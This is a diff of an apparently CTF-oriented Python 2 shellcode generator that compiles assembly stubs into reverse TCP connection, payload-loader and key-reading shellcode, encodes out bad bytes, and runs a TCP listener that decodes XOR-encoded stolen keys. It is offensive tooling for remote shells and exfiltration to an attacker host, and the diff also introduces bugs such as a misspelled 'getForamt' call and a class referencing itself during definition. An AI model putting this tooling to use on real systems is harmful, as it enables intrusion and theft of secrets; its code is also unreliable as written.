@@ -2,7 +2,6 @@
 # -*- encoding:utf-8 -*-
 # Written by Posquit0
 # It is forked from lifeasageek's scodeGenerator in PLUS
-# It's only for B10S Team Members
 
 # To Do List:
 # 1. IPv4[o] and IPv6
@@ -13,391 +12,379 @@
 # 6. Scode Classfication
 
 from re import findall
-import os, sys
+import os
 import tempfile
-from time import sleep
 from SocketServer import TCPServer, BaseRequestHandler
 # SocketServer.TCPServer.allow_reuse_address = True
 
-# OS for Shellcode : "freebsd" or "linux" ...
-DEFAULT_PLATFORM_OS = "linux"
+# Temp Direcotry
+TEMP_DIRECTORY = "temp"
 
-PLATFORM_OS_WIN = "win"
+# OS for Shellcode : "freebsd" or "linux" ...
 PLATFORM_OS_LINUX = "linux"
 PLATFORM_OS_FREEBSD = "freebsd"
-PLATFORM_OS_OPENBSD = "openbsd"
-PLATFORM_OS_SOLARIS = "solaris"
+#PLATFORM_OS_WIN = "win"
+#PLATFORM_OS_OPENBSD = "openbsd"
+#PLATFORM_OS_SOLARIS = "solaris"
+
+DEFAULT_PLATFORM_OS = "linux"
 
 # Arch for Shellcode : "x86" or "x64"
-DEFAULT_PLATFORM_ARCH = "i386"
+PLATFORM_ARCH_X86 = "x86"
+PLATFORM_ARCH_X64 = "x64"
+#PLATFORM_ARCH_ARM = "arm"
+#PLATFORM_ARCH_I386 = "i386"
+#PLATFORM_ARCH_IA64 = "ia64"
+#PLATFORM_ARCH_ARM64 = "arm64"
+#PLATFORM_ARCH_MIPS = "mips"
+#PLATFORM_ARCH_SPARC = "sparc"
+#PLATFORM_ARCH_POWERPC = "powerpc"
 
-PLATFORM_ARCH_I386 = "i386"
-PLATFORM_ARCH_IA64 = "ia64"
-PLATFORM_ARCH_ARM = "arm"
-PLATFORM_ARCH_ARM64 = "arm64"
-PLATFORM_ARCH_MIPS = "mips"
-PLATFORM_ARCH_SPARC = "sparc"
-PLATFORM_ARCH_POWERPC = "powerpc"
+DEFAULT_PLATFORM_ARCH = PLATFORM_ARCH_X86
 
 # Output Format : "python" or "cpp" ...
-DEFAULT_FORMAT = "python"
-
 FORMAT_PYTHON = "python"
 FORMAT_PERL = "perl"
 FORMAT_RUBY = "ruby"
 FORMAT_CPP = "cpp"
 
-class sCode(str):
-	def get(self):
-		return self
+DEFAULT_FORMAT = FORMAT_PYTHON
 
-	def getFormat(self, outFormat = "python"):
-		if outFormat == "python":
-			sCodeStr = """sCode = ""\n"""
-			for idx, ch in enumerate(self):
-				if idx % 8 == 0:
-					sCodeStr += "sCode += \""
-				sCodeStr += "\\x%02x" % ord(ch)
-				if idx % 8 == 7:
-					sCodeStr += "\"\n"
-			
-			if len(self) % 8 != 0:
-				sCodeStr += "\""
-			
-			return sCodeStr
+class ShellCode(str):
+    def get(self):
+        return self
 
-		elif outFormat == "cpp":
-			sCodeStr = """char SCODE[] = ""\n"""
-			for idx, ch in enumerate(self):
-				if idx % 8 == 0:
-					sCodeStr += "\""
-				sCodeStr +="\\x%02x" % ord(ch)
-				if idx % 8 == 7:
-					sCodeStr += "\"\n"
+    def getFormat(self, outFormat=DEFAULT_FORMAT):
+        if outFormat == FORMAT_PYTHON:
+            sCodeStr = """sCode = ""\n"""
+            for idx, ch in enumerate(self):
+                if idx % 8 == 0:
+                    sCodeStr += "sCode += \""
+                sCodeStr += "\\x%02x" % ord(ch)
+                if idx % 8 == 7:
+                    sCodeStr += "\"\n"
 
-			if len(self) % 8 != 0:
-				sCodeStr += "\""
+            if len(self) % 8 != 0:
+                sCodeStr += "\""
 
-			sCodeStr += ";"
+            return sCodeStr
 
-			return sCodeStr
+        elif outFormat == FORMAT_CPP:
+            sCodeStr = """char SCODE[] = ""\n"""
+            for idx, ch in enumerate(self):
+                if idx % 8 == 0:
+                    sCodeStr += "\""
+                sCodeStr += "\\x%02x" % ord(ch)
+                if idx % 8 == 7:
+                    sCodeStr += "\"\n"
+
+            if len(self) % 8 != 0:
+                sCodeStr += "\""
+
+            sCodeStr += ";"
+
+            return sCodeStr
 
 class InvalidPlatformError(Exception):
-	pass
+    pass
 
 class ScodeGen(object):
-	def __init__(self, platform = (DEFAULT_PLATFORM_OS, DEFAULT_PLATFORM_ARCH), stubFile = "sample.s"):
-		self.platform_PLATFORM_OS, self.platform_PLATFORM_ARCH = platform
-		self.stubFile = stubFile
+    def __init__(self, platform=(DEFAULT_PLATFORM_OS, DEFAULT_PLATFORM_ARCH), stubFile="sample.s"):
+        self.platform_os, self.platform_arch = platform
+        self.stubFile = stubFile
 
-		self.curPath = os.path.split(os.path.abspath(__file__))[0]
-#		self.curPath = self.curPath.replace("\\", "/")
-		
-		if self.platform_PLATFORM_OS == PLATFORM_OS_FREEBSD:
-			self.stubDir = os.path.join("stub", "freebsd")
-		elif self.platform_PLATFORM_OS == PLATFORM_OS_LINUX:
-			self.stubDir = os.path.join("stub", "linux")
-		else:
-			print "[!] Error: Platform <%s %s> is not available" % (self.platform_PLATFORM_OS, self.platform_PLATFORM_ARCH)
-			raise InvalidPlatformError
+        self.curPath = os.path.split(os.path.abspath(__file__))[0]
+#        self.curPath = self.curPath.replace("\\", "/")
 
-		if self.platform_PLATFORM_ARCH == PLATFORM_ARCH_I386:
-			self.stubDir = os.path.join(self.stubDir, "i386")
-		elif self.platform_PLATFORM_ARCH == PLATFORM_ARCH_IA64:
-			self.stubDir = os.path.join(self.stubDir, "ia64")
-		else:
-			print "[!] Error: Platform <%s %s> is not available" % (self.platform_PLATFORM_OS, self.platform_PLATFORM_ARCH)
-			raise InvalidPlatformError
-		
-		self.stubDir = os.path.join(self.curPath, self.stubDir)
+        if self.platform_os == PLATFORM_OS_FREEBSD:
+            self.stubDir = os.path.join("stub", "freebsd")
+        elif self.platform_os == PLATFORM_OS_LINUX:
+            self.stubDir = os.path.join("stub", "linux")
+        else:
+            print "[!] Error: Platform <%s %s> is not available" % (self.platform_os, self.platform_arch)
+            raise InvalidPlatformError
 
-		self.tempDir = os.path.join(self.curPath , "temp")
-		tempfile.tempdir = self.tempDir
+        if self.platform_arch == PLATFORM_ARCH_X86:
+            self.stubDir = os.path.join(self.stubDir, "x86")
+        elif self.platform_arch == PLATFORM_ARCH_X64:
+            self.stubDir = os.path.join(self.stubDir, "x64")
+        else:
+            print "[!] Error: Platform <%s %s> is not available" % (self.platform_os, self.platform_arch)
+            raise InvalidPlatformError
 
-		if os.path.exists(self.tempDir) == False:
-			os.mkdir(self.tempDir)
+        self.stubDir = os.path.join(self.curPath, self.stubDir)
 
-		self.tempFile = tempfile.mktemp()
-#		self.tempFile = self.tempFile.replace("\\", "/")
+        self.tempDir = os.path.join(self.curPath, TEMP_DIRECTORY)
+        tempfile.tempdir = self.tempDir
 
-		self.asmFile = self.tempFile + ".s"
-		self.objFile = self.tempFile + ".o"
-		self.dumpFile = self.tempFile + ".dump"
-		self.binFile = self.tempFile + ".bin"
-		self.encFile = self.tempFile + ".enc.bin"
-		print "[*] Temp File: <%s>" % self.tempFile
+        if not os.path.exists(self.tempDir):
+            os.mkdir(self.tempDir)
 
-		self.testFile = os.path.join(self.curPath, "stub", "testScode")
+        self.tempFile = tempfile.mktemp()
+#        self.tempFile = self.tempFile.replace("\\", "/")
 
-		self.sCode = ""
-		self._prepareStub()
-		self.sCode = self.__loadScode()
+        self.asmFile = self.tempFile + ".s"
+        self.objFile = self.tempFile + ".o"
+        self.dumpFile = self.tempFile + ".dump"
+        self.binFile = self.tempFile + ".bin"
+        self.encFile = self.tempFile + ".enc.bin"
+        print "[*] Temp File: <%s>" % self.tempFile
 
-		return
+        self.testFile = os.path.join(self.curPath, "stub", "testScode")
 
-	def _prepareStub(self):
-		print "[*] __prepareStub()"
-		
-		# Prepare Stub
-		stub = open(os.path.join(self.stubDir, self.stubFile)).read()
+        self.__prepareStub()
+        self.sCode = self.__loadScode()
 
-		open(self.asmFile, "w").write(stub)
+        return
 
-		# Compile Stub
-		os.system("as %s -o %s" % (self.asmFile, self.objFile))
-		os.system("objdump -d %s > %s" % (self.objFile, self.dumpFile))
-		return
+    def __prepareStub(self):
+        print "[*] __prepareStub()"
 
-	def __loadScode(self):
-		print "[*] __loadScode()"
-		dump = open(self.dumpFile).read()
-		
-		opCodeList = findall(":\t(.*)\t", dump)
-		sCode = "".join(
-			opCode.decode("hex")
-			for opCodes in opCodeList
-				for opCode in opCodes.strip().split()
-		)
-	
-		open(self.binFile, "wb").write(sCode + "\x00")
-		print "[*] wrote [0x%x] [%d] bytes shellcode\n" % (len(sCode), len(sCode))
+        # Prepare Stub
+        stub = open(os.path.join(self.stubDir, self.stubFile)).read()
 
-		return sCode
+        open(self.asmFile, "w").write(stub)
 
-	def testScode(self):
-		print "[*] Test Shellcode: %s %s" % (os.path.basename(self.testFile), os.path.basename(self.binFile))
-		testCode = "%s %s" % (self.testFile, self.binFile)
+        # Compile Stub
+        os.system("as %s -o %s" % (self.asmFile, self.objFile))
+        os.system("objdump -d %s > %s" % (self.objFile, self.dumpFile))
+        return
 
-		# Run Shellcode
-		os.system(testCode)
+    def __loadScode(self):
+        print "[*] __loadScode()"
+        dump = open(self.dumpFile).read()
 
-	def get(self):
-		return self.sCode
+        opCodeList = findall(":\t(.*)\t", dump)
+        sCode = "".join(
+            opCode.decode("hex")
+            for opCodes in opCodeList
+                for opCode in opCodes.strip().split()
+        )
 
-	def getFormat(self, outFormat = "python"):
-		if outFormat == "python":
-			sCodeStr = """sCode = ""\n"""
-			for idx, ch in enumerate(self.sCode):
-				if idx % 8 == 0:
-					sCodeStr += "sCode += \""
-				sCodeStr += "\\x%02x" % ord(ch)
-				if idx % 8 == 7:
-					sCodeStr += "\"\n"
-			
-			if len(self.sCode) % 8 != 0:
-				sCodeStr += "\""
-			
-			return sCodeStr
+        open(self.binFile, "wb").write(sCode + "\x00")
+        print "[*] wrote [0x%x] [%d] bytes shellcode\n" % (len(sCode), len(sCode))
 
-		elif outFormat == "cpp":
-			sCodeStr = """char SCODE[] = ""\n"""
-			for idx, ch in enumerate(self.sCode):
-				if idx % 8 == 0:
-					sCodeStr += "\""
-				sCodeStr +="\\x%02x" % ord(ch)
-				if idx % 8 == 7:
-					sCodeStr += "\"\n"
+        return ShellCode(sCode)
 
-			if len(self.sCode) % 8 != 0:
-				sCodeStr += "\""
+    def testScode(self):
+        print "[*] Test Shellcode: %s %s" % (os.path.basename(self.testFile), os.path.basename(self.binFile))
+        testCode = "%s %s" % (self.testFile, self.binFile)
 
-			sCodeStr += ";"
+        # Run Shellcode
+        os.system(testCode)
 
-			return sCodeStr
+    def get(self):
+        return self.sCode
 
-	def encode(self):
-		print "[*] encode()\n"
-		restrictedBytes = "0x00,0x0d,0x0a,0x2f"
-		cmdStr = "./encoder/encoder %s %s > %s" % (self.binFile, restrictedBytes, self.encFile)
-		os.system(cmdStr)
+    def getFormat(self, outFormat=FORMAT_PYTHON):
+        return self.sCode.getForamt(outFormat)
 
-		sCode = open(self.encFile, "rb").read()
-		print "[*] wrote [0x%x] [%d] bytes encoded shellcode\n" % (len(sCode), len(sCode))
-		return sCode
+    def encode(self, *restricted):
+        print "[*] encode()\n"
+        print restricted
+        restrictedBytes = "0x00,0x0d,0x0a,0x2f"
+        cmdStr = "./encoder/encoder %s %s > %s" % (self.binFile, restrictedBytes, self.encFile)
+        os.system(cmdStr)
+
+        enc_sCode = open(self.encFile, "rb").read()
+        print "[*] wrote [0x%x] [%d] bytes encoded shellcode\n" % (len(enc_sCode), len(enc_sCode))
+        return enc_sCode
 
 class PayloadLoaderScodeGen(ScodeGen):
-	def __init__(self, fdNum = 0x04, payloadSize = 0x400, platform = (DEFAULT_PLATFORM_OS, DEFAULT_PLATFORM_ARCH), stubFile = "read_jump.s"):
-		self.fdNum = fdNum
-		self.payloadSize = payloadSize # Unit : 256
-	
-		ScodeGen.__init__(self, platform, stubFile)
+    def __init__(self, fdNum = 0x04, payloadSize = 0x400, platform = (DEFAULT_PLATFORM_OS, DEFAULT_PLATFORM_ARCH), stubFile = "read_jump.s"):
+        self.fdNum = fdNum
+        self.payloadSize = payloadSize # Unit : 256
 
-		return
+        ScodeGen.__init__(self, platform, stubFile)
 
-	def _prepareStub(self):
-		print "[*] __prepareStub()"
-		
-		# Prepare Stub
-		stub = open(os.path.join(self.stubDir, self.stubFile)).read()
+        return
 
-		stub = stub.replace("{{FD_NUM}}", "0x%02x" % (self.fdNum + 1))
-		stub = stub.replace("{{PAYLOAD_SIZE}}", "0x%02x" % (self.payloadSize / 0x100))
+    def _prepareStub(self):
+        print "[*] __prepareStub()"
 
-		open(self.asmFile, "w").write(stub)
+        # Prepare Stub
+        stub = open(os.path.join(self.stubDir, self.stubFile)).read()
 
-		# Compile Stub
-		os.system("as %s -o %s" % (self.asmFile, self.objFile))
-		os.system("objdump -d %s > %s" % (self.objFile, self.dumpFile))
-		return
+        stub = stub.replace("{{FD_NUM}}", "0x%02x" % (self.fdNum + 1))
+        stub = stub.replace("{{PAYLOAD_SIZE}}", "0x%02x" % (self.payloadSize / 0x100))
+
+        open(self.asmFile, "w").write(stub)
+
+        # Compile Stub
+        os.system("as %s -o %s" % (self.asmFile, self.objFile))
+        os.system("objdump -d %s > %s" % (self.objFile, self.dumpFile))
+        return
 
 class ReverseConnectionScodeGen(ScodeGen):
-	def __init__(self, ipAddr, portNum, platform = (DEFAULT_PLATFORM_OS, DEFAULT_PLATFORM_ARCH), stubFile = "reverse_tcp.s"):
-		self.ipAddr = ipAddr
-		self.portNum = portNum
-	
-		ScodeGen.__init__(self, platform, stubFile)
+    def __init__(self, ipAddr, portNum, platform = (DEFAULT_PLATFORM_OS, DEFAULT_PLATFORM_ARCH), stubFile = "reverse_tcp.s"):
+        self.ipAddr = ipAddr
+        self.portNum = portNum
 
-		pass
+        ScodeGen.__init__(self, platform, stubFile)
 
-	def _prepareStub(self):
-		print "[*] __prepareStub()"
-		
-		# Prepare Stub
-		stub = open(os.path.join(self.stubDir, self.stubFile)).read()
+        pass
 
-		inetAddr = toInetAddr(self.ipAddr)
-		portNum = toInetPort(self.portNum)
+    def _prepareStub(self):
+        print "[*] __prepareStub()"
 
-		stub = stub.replace("{{IP_ADDR}}", "0x%s" % inetAddr)
-		stub = stub.replace("{{PORT}}", portNum)
+        # Prepare Stub
+        stub = open(os.path.join(self.stubDir, self.stubFile)).read()
 
-		open(self.asmFile, "w").write(stub)
+        inetAddr = toInetAddr(self.ipAddr)
+        portNum = toInetPort(self.portNum)
 
-		# Compile Stub
-		os.system("as %s -o %s" % (self.asmFile, self.objFile))
-		os.system("objdump -d %s > %s" % (self.objFile, self.dumpFile))
-		return
+        stub = stub.replace("{{IP_ADDR}}", "0x%s" % inetAddr)
+        stub = stub.replace("{{PORT}}", portNum)
+
+        open(self.asmFile, "w").write(stub)
+
+        # Compile Stub
+        os.system("as %s -o %s" % (self.asmFile, self.objFile))
+        os.system("objdump -d %s > %s" % (self.objFile, self.dumpFile))
+        return
 
 
 class ReadScodeGen(ScodeGen):
-	def __init__(self, keyFile, keySize, ipAddr, portNum, xorValue = 0x77, platform = (DEFAULT_PLATFORM_OS, DEFAULT_PLATFORM_ARCH), stubFile = "sample.s"):
-		self.keyFile = keyFile
-		self.keySize = keySize
-		self.ipAddr = ipAddr
-		self.portNum = portNum
-		self.xorValue = xorValue
-	
-		ScodeGen.__init__(self, platform, stubFile)
+    def __init__(self, keyFile, keySize, ipAddr, portNum, xorValue = 0x77, platform = (DEFAULT_PLATFORM_OS, DEFAULT_PLATFORM_ARCH), stubFile = "sample.s"):
+        self.keyFile = keyFile
+        self.keySize = keySize
+        self.ipAddr = ipAddr
+        self.portNum = portNum
+        self.xorValue = xorValue
 
-		return
+        ScodeGen.__init__(self, platform, stubFile)
 
-	def _prepareStub(self):
-		print "[*] __prepareStub()"
-		
-		# Prepare Stub
-		stub = open("%s/%s" % (self.stubDir, self.stubFile)).read()
+        return
 
-		open(self.asmFile, "w").write(stub)
+    def _prepareStub(self):
+        print "[*] __prepareStub()"
 
-		# Compile Stub
-		os.system("as %s -o %s" % (self.asmFile, self.objFile))
-		os.system("objdump -d %s > %s" % (self.objFile, self.dumpFile))
-		return
+        # Prepare Stub
+        stub = open("%s/%s" % (self.stubDir, self.stubFile)).read()
+
+        open(self.asmFile, "w").write(stub)
+
+        # Compile Stub
+        os.system("as %s -o %s" % (self.asmFile, self.objFile))
+        os.system("objdump -d %s > %s" % (self.objFile, self.dumpFile))
+        return
 
 class SecuInsideScodeGen(ReverseConnectionScodeGen):
-	def __init__(self, ipAddr, portNum, platform = (DEFAULT_PLATFORM_OS, DEFAULT_PLATFORM_ARCH), stubFile = "secuinside.s"):
-		ReverseConnectionScodeGen.__init__(self,ipAddr, portNum, platform, stubFile)
+    def __init__(self, ipAddr, portNum, platform = (DEFAULT_PLATFORM_OS, DEFAULT_PLATFORM_ARCH), stubFile = "secuinside.s"):
+        ReverseConnectionScodeGen.__init__(self,ipAddr, portNum, platform, stubFile)
 
-		return
+        return
 
-	def _prepareStub(self):
-		print "[*] __prepareStub()"
-		
-		# Prepare Stub
-		stub = open(os.path.join(self.stubDir, self.stubFile)).read()
+    def _prepareStub(self):
+        print "[*] __prepareStub()"
 
-		inetAddr = toInetAddr(self.ipAddr)
-		portNum = toInetPort(self.portNum)
+        # Prepare Stub
+        stub = open(os.path.join(self.stubDir, self.stubFile)).read()
 
-		stub = stub.replace("{{IP_ADDR}}", "0x%s" % inetAddr)
-		stub = stub.replace("{{PORT}}", portNum)
+        inetAddr = toInetAddr(self.ipAddr)
+        portNum = toInetPort(self.portNum)
 
-		open(self.asmFile, "w").write(stub)
+        stub = stub.replace("{{IP_ADDR}}", "0x%s" % inetAddr)
+        stub = stub.replace("{{PORT}}", portNum)
 
-		# Compile Stub
-		os.system("as %s -o %s" % (self.asmFile, self.objFile))
-		os.system("objdump -d %s > %s" % (self.objFile, self.dumpFile))
+        open(self.asmFile, "w").write(stub)
 
-		return
+        # Compile Stub
+        os.system("as %s -o %s" % (self.asmFile, self.objFile))
+        os.system("objdump -d %s > %s" % (self.objFile, self.dumpFile))
+
+        return
 
 
 class KeyServer(TCPServer):
-	pass	
+    KeyServer.allow_reuse_address = True
 
-KeyServer.allow_reuse_address = True
 
 class KeyHandler(BaseRequestHandler):
-	xorValue = 0x77
-	isDaemon = False
+    xorValue = 0x77
+    isDaemon = False
 
-	def handle(self):
-		while self.isDaemon:
-			# self.request is the TCP socket connected to the client
-			conn = self.request
-			encData = conn.recv(1024).strip()
+    def handle(self):
+        while self.isDaemon:
+            # self.request is the TCP socket connected to the client
+            conn = self.request
+            encData = conn.recv(1024).strip()
 
-			if encData == "":
-				conn.close()
-				return
+            if encData == "":
+                conn.close()
+                return
 
-			decData = "".join(
-				chr(ord(ch) ^ self.xorValue) for ch in encData
-			)
+            decData = "".join(
+                chr(ord(ch) ^ self.xorValue) for ch in encData
+            )
 
-			ipAddr = self.client_address[0]
-			portNum = self.client_address[1]
+            ipAddr = self.client_address[0]
+            portNum = self.client_address[1]
 
-			logStr = "[From %s : %s] XOR %02x\n" % (ipAddr, portNum, self.xorValue)
-			logStr += "[ENC] %s\n" % encData
-			logStr += "[DEC] %s\n" % decData
-			print logStr
+            logStr = "[From %s : %s] XOR %02x\n" % (ipAddr, portNum, self.xorValue)
+            logStr += "[ENC] %s\n" % encData
+            logStr += "[DEC] %s\n" % decData
+            print logStr
 
-			# auth() need to be override :D
-			self.auth()
-	
-		return
+            # auth() need to be override :D
+            self.auth()
 
-	def auth(self):
-		return
+        return
+
+    def auth(self):
+        return
 
 
 def toInetAddr(ipAddr):
-	inetTable = [
-		"%02x" % int(x) for x in ipAddr.split(".")
-	]
+    inetTable = [
+        "%02x" % int(x) for x in ipAddr.split(".")
+    ]
 
-	inetTable.reverse()
-	inetAddr = "".join(inetTable)
+    inetTable.reverse()
+    inetAddr = "".join(inetTable)
 
-	return inetAddr
+    return inetAddr
 
 def fromInetAddr(inetAddr):
-	inetAddrNum = int(inetAddr, 16)
-	inetTable = []
+    inetAddrNum = int(inetAddr, 16)
+    inetTable = []
 
-	while inetAddrNum :
-		inetTable.append(str(inetAddrNum % 256))
-		inetAddrNum /= 256
+    while inetAddrNum :
+        inetTable.append(str(inetAddrNum % 256))
+        inetAddrNum /= 256
 
-	ipAddr = ".".join(
-		inetTable
-	)
+    ipAddr = ".".join(
+        inetTable
+    )
 
-	return ipAddr
+    return ipAddr
 
 def toInetPort(portNum):
-	inetPort = 0
-	inetPort += (portNum & 0xFF) << 8
-	inetPort += (portNum & 0xFF00) >> 8
-	inetPort = "%04x" % inetPort
+    inetPort = 0
+    inetPort += (portNum & 0xFF) << 8
+    inetPort += (portNum & 0xFF00) >> 8
+    inetPort = "%04x" % inetPort
 
-	return inetPort
+    return inetPort
 
 def fromInetPort(inetPort):
-	inetPortNum = int(inetPort, 16)
+    inetPortNum = int(inetPort, 16)
 
-	portNum = 0
-	portNum += (inetPortNum & 0xFF) << 8
-	portNum += (inetPortNum & 0xFF00) >> 8
+    portNum = 0
+    portNum += (inetPortNum & 0xFF) << 8
+    portNum += (inetPortNum & 0xFF00) >> 8
 
-	return portNum
+    return portNum
+
+if __name__ == '__main__':
+    import optparse
+    from sys import argv
+
+    # Banner
+    print "Expluit0"
+    print "by Posquit0 <posquit0.bj@gmail.com>"
+
+
+    # Configure the command line parser
+
+    # Parse the command line arguments
